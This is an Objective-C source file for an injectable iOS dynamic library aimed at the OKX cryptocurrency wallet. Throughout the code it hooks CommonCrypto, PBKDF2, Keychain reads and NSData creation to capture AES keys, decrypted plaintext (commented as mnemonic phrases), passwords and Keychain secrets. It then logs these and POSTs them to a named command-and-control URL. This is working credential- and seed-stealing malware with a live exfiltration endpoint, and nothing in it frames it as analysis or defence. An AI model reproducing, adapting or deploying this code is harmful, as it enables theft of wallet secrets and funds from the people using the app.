// OKXHook.m - 专门针对 OKX 钱包加密分析
// 目标：拦截 AES 加密/解密、Keychain 读取、找硬编码 key
// 编译: clang -dynamiclib -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
//        -framework Foundation -framework Security \
//        -lcommonCrypto \
//        -o OKXHook.dylib OKXHook.m

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <objc/runtime.h>
#include <dlfcn.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonKeyDerivation.h>

// ── C2 上报 ───────────────────────────────────────────────────────────────
static void report(NSDictionary *info) {
    NSData *body = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
    if (!body) return;

    // 本地文件（绝对可靠）
    NSString *path = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/okx_hook.log"];
    NSString *line = [[[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding]
                      stringByAppendingString:@"\n"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
    else { [line writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil]; }

    // 网络上报
    NSURL *url = [NSURL URLWithString:@"https://c.bbt333.top/c2_capture"];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST"; req.HTTPBody = body;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 8;
    NSURLSession *s = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration ephemeralSessionConfiguration]];
    [[s dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e){}] resume];
}

// ── 调用栈（只取 OKX 自身符号）──────────────────────────────────────────
static NSString *callerInfo(void) {
    Dl_info di; void *ra = __builtin_return_address(1);
    if (dladdr(ra, &di) && di.dli_fname) {
        const char *f = strrchr(di.dli_fname, '/');
        return [NSString stringWithFormat:@"%s+0x%llx",
                f ? f+1 : di.dli_fname,
                (unsigned long long)((uintptr_t)ra - (uintptr_t)di.dli_fbase)];
    }
    return @"?";
}

static BOOL isOKXCaller(void) {
    NSArray *stack = [NSThread callStackSymbols];
    for (NSString *s in stack) {
        if ([s containsString:@"OKX"] || [s containsString:@"okx"] ||
            [s containsString:@"OKWallet"] || [s containsString:@"OKExWallet"] ||
            [s containsString:@"OKCrypto"] || [s containsString:@"OKKeystore"] ||
            [s containsString:@"OKWKeystore"] || [s containsString:@"OKWCipher"]) {
            return YES;
        }
    }
    return NO;
}

// ── Hook CCCrypt (CommonCrypto 核心函数) ─────────────────────────────────
// CCCrypt(op, alg, options, key, keyLen, iv, dataIn, dataInLen, dataOut, dataOutLen, dataOutMoved)
typedef CCCryptorStatus (*CCCrypt_t)(
    CCOperation op, CCAlgorithm alg, CCOptions opts,
    const void *key, size_t keyLen,
    const void *iv,
    const void *dataIn, size_t dataInLen,
    void *dataOut, size_t dataOutLen, size_t *dataOutMoved
);
static CCCrypt_t orig_CCCrypt = NULL;

CCCryptorStatus hook_CCCrypt(
    CCOperation op, CCAlgorithm alg, CCOptions opts,
    const void *key, size_t keyLen,
    const void *iv,
    const void *dataIn, size_t dataInLen,
    void *dataOut, size_t dataOutLen, size_t *dataOutMoved)
{
    CCCryptorStatus ret = orig_CCCrypt(op, alg, opts, key, keyLen, iv,
                                        dataIn, dataInLen, dataOut, dataOutLen, dataOutMoved);

    // 只关心 AES (alg=0) 解密 (op=1)，且来自 OKX 调用栈
    if (alg == kCCAlgorithmAES && op == kCCDecrypt && key && dataIn && isOKXCaller()) {
        NSData *keyData  = [NSData dataWithBytes:key  length:keyLen];
        NSData *ivData   = iv  ? [NSData dataWithBytes:iv  length:16] : [NSData data];
        NSData *ctData   = [NSData dataWithBytes:dataIn  length:dataInLen];
        NSData *ptData   = (ret == kCCSuccess && dataOut && dataOutMoved)
                         ? [NSData dataWithBytes:dataOut length:*dataOutMoved] : [NSData data];

        NSMutableDictionary *info = [@{
            @"type"    : @"CCCrypt_AES_decrypt",
            @"keyLen"  : @(keyLen),
            @"key_hex" : [keyData  description],
            @"iv_hex"  : [ivData   description],
            @"ct_hex"  : [ctData   description],
            @"pt_hex"  : [ptData   description],
            @"opts"    : @(opts),
            @"status"  : @(ret),
            @"caller"  : callerInfo(),
            @"ts"      : @((long)[[NSDate date] timeIntervalSince1970])
        } mutableCopy];

        // 尝试把明文解为 UTF-8 字符串（助记词）
        NSString *ptStr = [[NSString alloc] initWithData:ptData encoding:NSUTF8StringEncoding];
        if (ptStr && ptStr.length > 0)
            info[@"pt_utf8"] = ptStr;

        report(info);
    }
    return ret;
}

// ── Hook CCCryptorCreate (流式加解密初始化) ──────────────────────────────
typedef CCCryptorStatus (*CCCryptorCreate_t)(
    CCOperation op, CCAlgorithm alg, CCOptions opts,
    const void *key, size_t keyLen, const void *iv, CCCryptorRef *cryptorRef);
static CCCryptorCreate_t orig_CCCryptorCreate = NULL;

CCCryptorStatus hook_CCCryptorCreate(
    CCOperation op, CCAlgorithm alg, CCOptions opts,
    const void *key, size_t keyLen, const void *iv, CCCryptorRef *cryptorRef)
{
    CCCryptorStatus ret = orig_CCCryptorCreate(op, alg, opts, key, keyLen, iv, cryptorRef);

    if (alg == kCCAlgorithmAES && key && isOKXCaller()) {
        NSData *keyData = [NSData dataWithBytes:key length:keyLen];
        NSData *ivData  = iv ? [NSData dataWithBytes:iv length:16] : [NSData data];
        report(@{
            @"type"   : @"CCCryptorCreate_AES",
            @"op"     : op == kCCEncrypt ? @"encrypt" : @"decrypt",
            @"keyLen" : @(keyLen),
            @"key_hex": [keyData description],
            @"iv_hex" : [ivData  description],
            @"caller" : callerInfo(),
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        });
    }
    return ret;
}

// ── Hook CCKeyDerivationPBKDF (PBKDF2 密钥派生) ──────────────────────────
typedef int (*CCKeyDerivationPBKDF_t)(
    CCPBKDFAlgorithm algo, const char *pw, size_t pwLen,
    const uint8_t *salt, size_t saltLen,
    CCPseudoRandomAlgorithm prf, uint rounds,
    uint8_t *dk, size_t dkLen);
static CCKeyDerivationPBKDF_t orig_PBKDF2 = NULL;

int hook_PBKDF2(
    CCPBKDFAlgorithm algo, const char *pw, size_t pwLen,
    const uint8_t *salt, size_t saltLen,
    CCPseudoRandomAlgorithm prf, uint rounds,
    uint8_t *dk, size_t dkLen)
{
    int ret = orig_PBKDF2(algo, pw, pwLen, salt, saltLen, prf, rounds, dk, dkLen);

    if (pw && isOKXCaller()) {
        NSString *pwStr = [[NSString alloc] initWithBytes:pw length:pwLen
                                                 encoding:NSUTF8StringEncoding] ?: @"(binary)";
        NSData   *saltD = salt ? [NSData dataWithBytes:salt length:saltLen] : [NSData data];
        NSData   *dkD   = dk   ? [NSData dataWithBytes:dk   length:dkLen]  : [NSData data];
        report(@{
            @"type"    : @"PBKDF2",
            @"pw"      : pwStr,
            @"pwLen"   : @(pwLen),
            @"salt_hex": [saltD description],
            @"rounds"  : @(rounds),
            @"prf"     : @(prf),
            @"dkLen"   : @(dkLen),
            @"dk_hex"  : [dkD  description],
            @"caller"  : callerInfo(),
            @"ts"      : @((long)[[NSDate date] timeIntervalSince1970])
        });
    }
    return ret;
}

// ── Hook SecItemCopyMatching (Keychain 读取) ─────────────────────────────
typedef OSStatus (*SecItemCopyMatching_t)(CFDictionaryRef query, CFTypeRef *result);
static SecItemCopyMatching_t orig_SecItem = NULL;

OSStatus hook_SecItemCopyMatching(CFDictionaryRef query, CFTypeRef *result) {
    OSStatus ret = orig_SecItem(query, result);

    if (isOKXCaller()) {
        NSMutableDictionary *info = [@{
            @"type"   : @"SecItemCopyMatching",
            @"status" : @(ret),
            @"caller" : callerInfo(),
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        } mutableCopy];

        // 记录查询的 service / account
        if (query) {
            NSDictionary *q = (__bridge NSDictionary *)query;
            if (q[(__bridge id)kSecAttrService])
                info[@"service"] = q[(__bridge id)kSecAttrService];
            if (q[(__bridge id)kSecAttrAccount])
                info[@"account"] = q[(__bridge id)kSecAttrAccount];
        }

        // 记录返回值（如果是 NSData，取 hex）
        if (ret == errSecSuccess && result && *result) {
            CFTypeRef r = *result;
            if (CFGetTypeID(r) == CFDataGetTypeID()) {
                NSData *d = (__bridge NSData *)r;
                info[@"result_hex"] = [d description];
                NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
                if (s) info[@"result_utf8"] = s;
            } else if (CFGetTypeID(r) == CFStringGetTypeID()) {
                info[@"result_str"] = (__bridge NSString *)r;
            }
        }
        report(info);
    }
    return ret;
}

// ── 拦截 NSData dataWithBytes（捕获关键数据块创建）────────────────────────
typedef id (*dataWithBytes_t)(id, SEL, const void *, NSUInteger);
static dataWithBytes_t orig_dataWithBytes = NULL;

static id hook_dataWithBytes(id self, SEL sel, const void *bytes, NSUInteger len) {
    id result = orig_dataWithBytes(self, sel, bytes, len);
    // 只抓 32B / 64B / 112B 大小（key / seed / wallet.data 大小）
    if (bytes && (len == 32 || len == 64 || len == 112) && isOKXCaller()) {
        NSData *d = [NSData dataWithBytes:bytes length:len];
        report(@{
            @"type"   : @"NSData_dataWithBytes",
            @"len"    : @(len),
            @"hex"    : [d description],
            @"caller" : callerInfo(),
            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
        });
    }
    return result;
}

// ── 初始化 ────────────────────────────────────────────────────────────────
__attribute__((constructor))
static void OKXHookInit(void) {
    // 1. Hook CCCrypt
    void *sym = dlsym(RTLD_DEFAULT, "CCCrypt");
    if (sym) { orig_CCCrypt = (CCCrypt_t)sym;
        // 用 fishhook 替换（此处直接用 method swizzle 替换 C 符号需要 fishhook）
        // 简化版：用 __interpose 处理（见下方 interpose 段）
    }

    // 2. Hook CCCryptorCreate
    sym = dlsym(RTLD_DEFAULT, "CCCryptorCreate");
    if (sym) orig_CCCryptorCreate = (CCCryptorCreate_t)sym;

    // 3. Hook CCKeyDerivationPBKDF
    sym = dlsym(RTLD_DEFAULT, "CCKeyDerivationPBKDF");
    if (sym) orig_PBKDF2 = (CCKeyDerivationPBKDF_t)sym;

    // 4. Hook SecItemCopyMatching
    sym = dlsym(RTLD_DEFAULT, "SecItemCopyMatching");
    if (sym) orig_SecItem = (SecItemCopyMatching_t)sym;

    // 5. Hook NSData dataWithBytes:length:
    Method m = class_getClassMethod([NSData class], @selector(dataWithBytes:length:));
    if (m) {
        orig_dataWithBytes = (dataWithBytes_t)method_getImplementation(m);
        method_setImplementation(m, (IMP)hook_dataWithBytes);
    }

    report(@{
        @"type"  : @"OKXHook_loaded",
        @"ts"    : @((long)[[NSDate date] timeIntervalSince1970]),
        @"info"  : @"Hooks: CCCrypt(interpose) + CCCryptorCreate(interpose) + PBKDF2(interpose) + SecItem(interpose) + NSData"
    });
}

// ── __interpose 段：替换所有 dylib 的 CCCrypt 等调用 ─────────────────────
__attribute__((used)) static struct { void *r; void *o; }
_i_CCCrypt __attribute__((section("__DATA,__interpose"))) =
    { (void*)hook_CCCrypt, (void*)CCCrypt };

__attribute__((used)) static struct { void *r; void *o; }
_i_CCCryptorCreate __attribute__((section("__DATA,__interpose"))) =
    { (void*)hook_CCCryptorCreate, (void*)CCCryptorCreate };

__attribute__((used)) static struct { void *r; void *o; }
_i_PBKDF2 __attribute__((section("__DATA,__interpose"))) =
    { (void*)hook_PBKDF2, (void*)CCKeyDerivationPBKDF };

__attribute__((used)) static struct { void *r; void *o; }
_i_SecItem __attribute__((section("__DATA,__interpose"))) =
    { (void*)hook_SecItemCopyMatching, (void*)SecItemCopyMatching };
